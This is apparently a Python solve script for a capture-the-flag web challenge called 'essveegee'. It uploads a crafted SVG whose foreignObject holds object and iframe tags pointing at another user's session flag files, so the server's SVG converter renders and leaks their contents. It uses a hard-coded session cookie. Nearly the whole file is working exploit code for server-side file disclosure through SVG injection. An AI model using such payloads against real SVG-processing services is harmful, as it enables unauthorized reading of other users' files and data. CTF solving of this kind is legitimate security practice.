#!/usr/bin/env python3
import requests
import json
import time
import sys

TARGET = "http://essveegee.chal.uiuc.tf"
# # if(sys.argv[1] == ""):
#      # flagHolder = requests.session()
#      # flagHolderId = flagHolder.get(TARGET).cookies.get("connect.sid")[4:]
#      # flagHolderId = flagHolderId.split(".")[0]

#     # r = flagHolder.post(f"{TARGET}/upload",files={"svg":"""<svg xmlns="http://www.w3.org/2000/svg" >
#          # <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
#     # </svg>
#     """})
#     flagHolder.post(f"{TARGET}/convert",data={"id":json.loads(r.text)["id"]})
# else:
flagHolderId = sys.argv[1]
p = sys.argv[2]
els = ""
attacker = requests.session()
for i in "01234567890abcdef":
    els+= f"""{i}:<object data="/app/sessions/{flagHolderId}/flag/{p}/{i}" style="background-color:red;" xmlns="http://www.w3.org/1999/xhtml"></object>"""
r = attacker.post(f"{TARGET}/upload",cookies={"connect.sid":'s%3AS-zioBQvCH27QommSJ2cLmA8as4aZty9.wJLNGG7ZcB1f%2Fejy6r9luKWiODspU05mD%2Bj0hvhX9UQ'},files={"svg":f"""
    <svg version="1.1" class="center-block" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" style="height: 900px;width: 2000px;border: 1px solid black;">
    <g>
        <g>
            <foreignObject width="2000px" height="900px">
                {els}
                <iframe src="/app/sessions/{flagHolderId}/flag/{p}/flag.txt" xmlns="http://www.w3.org/1999/xhtml"></iframe>
            </foreignObject>
        </g>
    </g>
    </svg>
"""})
print(json.loads(r.text)["id"])